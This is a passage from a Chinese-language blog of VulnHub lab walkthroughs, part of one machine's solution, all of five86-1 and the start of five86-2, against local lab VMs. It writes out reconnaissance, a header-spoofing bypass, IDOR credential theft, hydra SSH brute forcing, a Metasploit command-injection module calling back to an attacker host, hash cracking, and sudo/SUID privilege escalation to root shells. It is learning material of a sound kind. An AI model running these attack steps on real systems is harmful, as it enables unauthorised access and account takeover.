2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:06:D9:59 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.002 days (since Wed Mar  4 00:21:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;256 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-8"><a class="markdownIt-Anchor" href="#web路径枚举-8"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.233/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.164&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;config&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;index.php (CODE:200|SIZE:120)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;misc&#x2F;                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;robots.txt (CODE:200|SIZE:32)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;server-status (CODE:403|SIZE:294)</span><br></pre></td></tr></table></figure><ul><li>访问<code>/</code>： <code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></li><li>访问<code>robots.txt</code>：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Allow: &#x2F;heyhoo.txt</span><br></pre></td></tr></table></figure><ul><li>访问<code>/heyhoo.txt</code>：<code>Great! What you need now is reconn, attack and got the shell</code></li></ul><h2 id="漏洞利用-8"><a class="markdownIt-Anchor" href="#漏洞利用-8"></a> 漏洞利用</h2><p>使用hackbar进行操作<br />添加HTTP Header: <code>X-Forwarded-For: 0.0.0.0</code><br />请求<code>/</code>之后发现页面无变化，而浏览器路径变成<code>/?page=index</code><br />再次请求<code>/?page=index</code>，则显示正常页面</p><blockquote><p>个人推测是仿造IP请求<code>/</code>之后，触发302跳转至<code>?page=index</code>，而跳转之后的请求进行伪造IP，所以需要进行两步操作。包括之后的请求都要先点击链接，导入hackbar，在hackbar中请求。</p></blockquote><p>在register页面中注册一个用户<br />随后login<br />这两步推荐在BurpSuite中操作<br />HTTP Header加上<code>X-Forwarded-For: 0.0.0.0</code>即可</p><p>成功登入之后路径为<code>/index.php?page=dashboard&amp;user_id=12</code><br />而进入profile之后可以在源码中查看当前用户名与密码</p><p>更改user_id参数，即可未授权访问其他用户的profile页面<br />将所获取的账户与密码写入文件，再添加两个常用词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">eweuhtandingan</span><br><span class="line">skuyatuh</span><br><span class="line">aingmaung</span><br><span class="line">qwerty!!!</span><br><span class="line">sundatea</span><br><span class="line">indONEsia</span><br><span class="line">sedihaingmah</span><br><span class="line">cedihhihihi</span><br><span class="line">alice</span><br><span class="line">4lic3</span><br><span class="line">abdikasepak</span><br><span class="line">dorrrrr</span><br><span class="line">admin</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>利用hydra对SSH服务进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -L dic -P dic  -v -e ns ssh:&#x2F;&#x2F;192.168.31.164</span><br><span class="line">    [22][ssh] host: 192.168.31.164   login: alice   password: 4lic3</span><br></pre></td></tr></table></figure><p>成功获取账户</p><h2 id="权限提升-8"><a class="markdownIt-Anchor" href="#权限提升-8"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh alice@192.168.31.164</span><br><span class="line">    4lic3</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>用sudo权限使用php来进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo php -r &quot;system(&#39;&#x2F;bin&#x2F;bash&#39;);&quot;</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>密码共用</p></blockquote><p>值得一提的是，除了WEB服务中alice账户可以用于登入SSH服务之外，数据库的密码(<code>/var/www/html/config/config.php</code>)也是root用户的口令。进行靶机渗透时经常会出现这种状况，当获取到一些账户时，不妨试着在后台运行一下hydra。现实中这种情况也很常见，虽然理想状态下每个密码都足够复杂而且各不相同，但终将只是理想状态罢了。</p><blockquote><p>Mysql</p></blockquote><p>渗透过程中也尝试过针对user_id参数进行SQL注入，但是也没有进展，回过头想一下nmap扫描端口时并未发现Mysql服务。后来在网上看了一下，mysql可以设置为仅本地访问(localhost/127.0.0.1/0.0.0.0)。</p><blockquote><p>sudo</p></blockquote><p>之前对于<code>sudo</code>的理解还是不够透彻，仅仅单纯地以为sudo权限就是<code>sudo -i</code>直接提root，或者sudo接命令，片面地认为sudo权限是在账号层面上的。实则可以更为细化，如让账户可以以sudo权限执行某些命令。</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/ftl1012/p/sudo.html">sudo</a><br /><a href="http://www.freesion.com/article/4895226687/">wp</a><br /><a href="https://www.cnblogs.com/longyao/p/11719579.html">mysql</a></p></blockquote><hr /><h1 id="five86-1"><a class="markdownIt-Anchor" href="#five86-1"></a> <a href="https://www.vulnhub.com/entry/five86-1,417/">five86-1</a></h1><p><code>2020/03/08 18:20:27</code></p><h2 id="端口扫描-9"><a class="markdownIt-Anchor" href="#端口扫描-9"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.209</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;ona</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">10000&#x2F;tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 6E79CCAA5DCB1FD29C6A7C795BBD608E</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; Charset&#x3D;iso-8859-1).</span><br><span class="line">MAC Address: 08:00:27:D8:1F:90 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 7.882 days (since Sat Feb 29 08:12:28 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-9"><a class="markdownIt-Anchor" href="#web路径枚举-9"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.209/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.209&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;index.html (CODE:200|SIZE:30)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;reports (CODE:401|SIZE:461)                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;robots.txt (CODE:200|SIZE:29)                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.209&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><ul><li><code>/reports</code>路径需要进行basic认证</li><li>访问<code>/robots.txt</code>，得到如下内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;ona</span><br></pre></td></tr></table></figure><ul><li>路径<code>/ona</code>下运行的是&quot;opennetadmin v18.1.1&quot;</li><li>10000端口上的webmin服务需要账户</li></ul><h2 id="漏洞利用-9"><a class="markdownIt-Anchor" href="#漏洞利用-9"></a> 漏洞利用</h2><ul><li>opennetadmin存在RCE漏洞</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                | exploits&#x2F;php&#x2F;webapps&#x2F;26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits&#x2F;php&#x2F;webapps&#x2F;47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                  | exploits&#x2F;php&#x2F;webapps&#x2F;47691.sh</span><br></pre></td></tr></table></figure><ul><li>webmin存在RCE漏洞但是需要提供账户</li></ul><p>在MSF中使用ona的RCE漏洞利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection</span><br><span class="line">set RHOST 192.168.31.209</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>获取shell</p><blockquote><p>当时MSF在kali源上的最新版本为5.0.76，而github上已更新到5.0.79，而且该RCE漏洞模块是在5.0.77版本加入MSF，所以需要手动将漏洞模块导入MSF，详情见下文</p></blockquote><h2 id="权限提升-9"><a class="markdownIt-Anchor" href="#权限提升-9"></a> 权限提升</h2><p>查看文件<code>/var/www/html/reports/.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;reports&#x2F;.htaccess</span><br><span class="line"></span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName &quot;Restricted Area&quot;</span><br><span class="line">AuthUserFile &#x2F;var&#x2F;www&#x2F;.htpasswd</span><br><span class="line">require valid-user</span><br></pre></td></tr></table></figure><p>查看文件<code>/var/www/.htpasswd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;.htpasswd </span><br><span class="line"></span><br><span class="line">douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1</span><br><span class="line"></span><br><span class="line"># To make things slightly less painful (a standard dictionary will likely fail),</span><br><span class="line"># use the following character set for this 10 character password: aefhrt</span><br></pre></td></tr></table></figure><p>得到账户douglas的密码hash与密码的相关信息</p><ul><li>由字符aefhrt组成</li><li>长度为十位</li></ul><p>将hash保存到本地<br /><code>echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' &gt; passwd</code></p><p>使用crunch构造字典<br /><code>crunch 10 10 aefhrt -o pass</code></p><p>使用john爆破hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;pass --format&#x3D;md5crypt passwd</span><br><span class="line">john --show passwd</span><br><span class="line">    douglas:fatherrrrr</span><br></pre></td></tr></table></figure><p>使用douglas账户登入目标主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh douglas:192.168.31.206</span><br><span class="line">fatherrrrr</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for douglas on five86-1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User douglas may run the following commands on five86-1:</span><br><span class="line">    (jen) NOPASSWD: &#x2F;bin&#x2F;cp</span><br></pre></td></tr></table></figure><p>可以以用户jen身份执行cp命令</p><p>生成ssh秘钥，拷贝至jen账户的home目录中，切换至账户jen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;jen@127.0.0.1&quot;</span><br><span class="line">cp &#x2F;home&#x2F;douglas&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;tmp&#x2F;authorized_keys</span><br><span class="line">sudo -u jen cp &#x2F;tmp&#x2F;authorized_keys &#x2F;home&#x2F;jen&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure><p>登入信息中得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have new mail.</span><br></pre></td></tr></table></figure><p>查看邮件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;mail&#x2F;jen</span><br><span class="line"></span><br><span class="line">From roy@five86-1 Wed Jan 01 03:17:00 2020</span><br><span class="line">Return-path: &lt;roy@five86-1&gt;</span><br><span class="line">Envelope-to: jen@five86-1</span><br><span class="line">Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">Received: from roy by five86-1 with local (Exim 4.92)</span><br><span class="line">(envelope-from &lt;roy@five86-1&gt;)</span><br><span class="line">id 1imZBc-0001FU-El</span><br><span class="line">for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">To: jen@five86-1</span><br><span class="line">Subject: Monday Moss</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;</span><br><span class="line">From: Roy Trenneman &lt;roy@five86-1&gt;</span><br><span class="line">Date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line"></span><br><span class="line">Hi Jen,</span><br><span class="line"></span><br><span class="line">As you know, I&#39;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.</span><br><span class="line"></span><br><span class="line">But anyway, I had to change Moss&#39;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!</span><br><span class="line"></span><br><span class="line">Moss will understand (ha ha ha ha).</span><br><span class="line"></span><br><span class="line">Tanks,</span><br><span class="line">Roy</span><br></pre></td></tr></table></figure><p>获得账户moss的密码</p><p>切换至账户moss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su moss</span><br><span class="line">Fire!Fire!</span><br></pre></td></tr></table></figure><p>在路径<code>/home/moss</code>下发现隐藏文件夹<code>.game</code><br />进入文件夹<code>.game</code>之后发现存在一个root权限的文件<code>upyourgame</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwx------ 2 moss moss  4096 Jan  1 03:53 .</span><br><span class="line">drwx------ 3 moss moss  4096 Jan  1 23:05 ..</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 battlestar -&gt; &#x2F;usr&#x2F;games&#x2F;battlestar</span><br><span class="line">lrwxrwxrwx 1 moss moss    14 Jan  1 03:23 bcd -&gt; &#x2F;usr&#x2F;games&#x2F;bcd</span><br><span class="line">lrwxrwxrwx 1 moss moss    21 Jan  1 03:21 bombardier -&gt; &#x2F;usr&#x2F;games&#x2F;bombardier</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 empire -&gt; &#x2F;usr&#x2F;games&#x2F;empire</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:23 freesweep -&gt; &#x2F;usr&#x2F;games&#x2F;freesweep</span><br><span class="line">lrwxrwxrwx 1 moss moss    15 Jan  1 03:23 hunt -&gt; &#x2F;usr&#x2F;games&#x2F;hunt</span><br><span class="line">lrwxrwxrwx 1 moss moss    20 Jan  1 03:22 ninvaders -&gt; &#x2F;usr&#x2F;games&#x2F;ninvaders</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:19 nsnake -&gt; &#x2F;usr&#x2F;games&#x2F;nsnake</span><br><span class="line">lrwxrwxrwx 1 moss moss    25 Jan  1 03:21 pacman4console -&gt; &#x2F;usr&#x2F;games&#x2F;pacman4console</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:22 petris -&gt; &#x2F;usr&#x2F;games&#x2F;petris</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 snake -&gt; &#x2F;usr&#x2F;games&#x2F;snake</span><br><span class="line">lrwxrwxrwx 1 moss moss    17 Jan  1 03:20 sudoku -&gt; &#x2F;usr&#x2F;games&#x2F;sudoku</span><br><span class="line">-rwsr-xr-x 1 root root 16824 Jan  1 03:52 upyourgame</span><br><span class="line">lrwxrwxrwx 1 moss moss    16 Jan  1 03:22 worms -&gt; &#x2F;usr&#x2F;games&#x2F;worms</span><br></pre></td></tr></table></figure><p>执行之后任意输入五次即可进入root权限下的sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;upyourgame </span><br><span class="line">Would you like to play a game? 1</span><br><span class="line"></span><br><span class="line">Could you please repeat that? 1</span><br><span class="line"></span><br><span class="line">Nope, you&#39;ll need to enter that again. 1</span><br><span class="line"></span><br><span class="line">You entered: No.  Is this correct? 1</span><br><span class="line"></span><br><span class="line">We appear to have a problem?  Do we have a problem? 1</span><br><span class="line"></span><br><span class="line">Made in Britain.</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1001(moss) groups&#x3D;1001(moss)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>手动导入MSF模块</p></blockquote><p>searchsploit命令找到了存储于本地的MSF漏洞利用模块，其路径为</p><p><code>/usr/share/exploitdb/exploits/linux/webapps/47772.rb</code></p><p>执行如下命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;webapps&#x2F;47772.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;opennetadmin_ping_cmd_injection.rb</span><br><span class="line">chmod 644 opennetadmin_ping_cmd_injection.rb.rb</span><br></pre></td></tr></table></figure><p>之后在MSF中执行<code>reload_all</code></p><blockquote><p>cp提权</p></blockquote><p>之前看到有文章大概列举了一下SUID提权的几个指令，其中有cp命令，但是没有文章没有列举出详细的操作过程<br />个人想法是用root权限的cp命令去覆盖掉passwd文件，这次靶机渗透学到了用cp命令去写入ssh信任秘钥来进行水平提权<br />大概不能将同样的套路用于垂直提权至root，因为一般ssh默认禁止掉了root登入</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/kuaile1314/p/12252563.html">WP</a></p></blockquote><hr /><h1 id="five86-2"><a class="markdownIt-Anchor" href="#five86-2"></a> <a href="https://www.vulnhub.com/entry/five86-2,418/">five86-2</a></h1><p><code>2020/03/15 21:54:23</code></p><h2 id="端口扫描-10"><a class="markdownIt-Anchor" href="#端口扫描-10"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -Pn -T5 -sV -A -n -v 192.168.31.209</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.51</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">21&#x2F;tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80&#x2F;tcp open   ssl&#x2F;http Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;192.168.31.51&#x2F;</span><br><span class="line">MAC Address: 08:00:27:29:D0:EB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose|storage-misc|WAP|media device</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (95%), HP embedded (91%), Netgear RAIDiator 4.X (91%), Ubiquiti AirOS 5.X (90%), ZyXEL embedded (90%), Ubiquiti embedded (90%)</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;h:hp:p2000_g3 cpe:&#x2F;o:netgear:raidiator:4.2.24 cpe:&#x2F;o:ubnt:airos:5.2.6 cpe:&#x2F;o:linux:linux_kernel:2.6.32 cpe:&#x2F;h:ubnt:airmax_nanostation</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 2.6.32 - 2.6.39 (93%), Linux 2.6.37 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), HP P2000 G3 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 32.468 days (since Tue Feb 11 09:55:14 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-10"><a class="markdownIt-Anchor" href="#web路径枚举-10"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.51/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.51&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;index.php (CODE:301|SIZE:0)                                           </span><br><span class="line">+ 